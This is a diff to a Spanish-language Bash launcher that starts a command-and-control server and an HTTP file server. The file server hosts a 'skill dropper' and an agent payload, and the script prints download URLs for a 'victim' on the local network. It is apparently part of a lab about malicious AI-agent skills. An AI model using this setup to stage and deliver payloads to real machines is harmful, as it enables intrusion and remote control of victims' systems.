@@ -30,11 +30,11 @@ step() { echo -e "\n${BLD}${PRP}▶ $*${RST}"; }
 
 SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 C2_DIR="$SCRIPT_DIR/server"
-SKILL_DIR="$SCRIPT_DIR/victim-lab/skill"
+DOWNLOADS_DIR="$SCRIPT_DIR/downloads"
 VENV="$SCRIPT_DIR/.venv"
 
 C2_PORT="${C2_PORT:-5001}"
-FS_PORT="${FS_PORT:-8001}"
+FS_PORT="${FS_PORT:-8000}"
 C2_LOG="$SCRIPT_DIR/.c2.log"
 FS_LOG="$SCRIPT_DIR/.fileserver.log"
 
@@ -77,7 +77,7 @@ echo -e "${RST}"
 echo -e "  ${BLD}C2 server  +  HTTP File Server${RST}"
 echo -e "  ${YEL}────────────────────────────────────────────────────────────────────${RST}"
 echo -e "  ${CYN}C2 Panel  ${RST}   → ${BLD}http://localhost:${C2_PORT}${RST}"
-$START_FS && echo -e "  ${PRP}File Server${RST}  → ${BLD}http://localhost:${FS_PORT}/neural_nexus_skill.py${RST}" || true
+$START_FS && echo -e "  ${PRP}File Server${RST}  → ${BLD}http://localhost:${FS_PORT}/${RST}  (agents/ + victim-lab/skill/)" || true
 echo -e "  ${YEL}────────────────────────────────────────────────────────────────────${RST}\n"
 
 cd "$SCRIPT_DIR"
@@ -94,8 +94,10 @@ ok "venv: $VENV"
 ok "server/app.py encontrado"
 
 if $START_FS; then
-  [[ ! -f "$SKILL_DIR/neural_nexus_skill.py" ]] && fail "victim-lab/skill/neural_nexus_skill.py no encontrado"
-  ok "skill dropper encontrado"
+  [[ ! -d "$DOWNLOADS_DIR" ]] && fail "downloads/ no encontrado — ejecuta setup.sh primero"
+  [[ ! -f "$DOWNLOADS_DIR/neural_nexus_skill.py" ]] && fail "downloads/neural_nexus_skill.py no encontrado"
+  [[ ! -f "$DOWNLOADS_DIR/advanced_agent.py" ]]     && fail "downloads/advanced_agent.py no encontrado"
+  ok "downloads/ presente (skill + agents)"
 fi
 
 # Comprobar que los puertos estén libres
@@ -131,8 +133,8 @@ ok "C2 running (PID $C2_PID)  →  logs: $C2_LOG"
 if $START_FS; then
   step "Lanzando HTTP file server (puerto ${FS_PORT})"
 
-  info "Sirviendo directorio: victim-lab/skill/"
-  (cd "$SKILL_DIR" && python3 -m http.server "$FS_PORT" \
+  info "Sirviendo directorio: downloads/"
+  (cd "$DOWNLOADS_DIR" && python3 -m http.server "$FS_PORT" \
     >> "$FS_LOG" 2>&1) &
   FS_PID=$!
 
@@ -171,7 +173,7 @@ echo -e "  ${BLD}${GRN}Stack activo:${RST}"
 echo -e "  ${YEL}┌───────────────────────────────────────────────────────────────────┐${RST}"
 printf  "  ${YEL}│${RST}  %-14s  PID %-7s  %-38s  ${YEL}│${RST}\n" "C2 Panel"    "$C2_PID"  "http://localhost:${C2_PORT}"
 if $START_FS && [[ $FS_PID -ne 0 ]]; then
-  printf "  ${YEL}│${RST}  %-14s  PID %-7s  %-38s  ${YEL}│${RST}\n" "File Server" "$FS_PID"  "http://localhost:${FS_PORT}/neural_nexus_skill.py"
+  printf "  ${YEL}│${RST}  %-14s  PID %-7s  %-38s  ${YEL}│${RST}\n" "File Server" "$FS_PID"  "http://localhost:${FS_PORT}/"
 fi
 echo -e "  ${YEL}└───────────────────────────────────────────────────────────────────┘${RST}"
 echo ""
@@ -179,7 +181,8 @@ echo ""
 if [[ -n "$HOST_IP" && "$HOST_IP" != "127.0.0.1" ]]; then
   echo -e "  ${BLD}Acceso desde la red local (víctima):${RST}"
   echo -e "  ${CYN}NN_C2=${RST}${BLD}http://${HOST_IP}:${C2_PORT}${RST}"
-  $START_FS && echo -e "  Dropper URL: ${CYN}http://${HOST_IP}:${FS_PORT}/neural_nexus_skill.py${RST}" || true
+  $START_FS && echo -e "  Skill dropper:  ${CYN}http://${HOST_IP}:${FS_PORT}/neural_nexus_skill.py${RST}" || true
+  $START_FS && echo -e "  Agent download: ${CYN}http://${HOST_IP}:${FS_PORT}/advanced_agent.py${RST}" || true
   echo ""
 fi
 
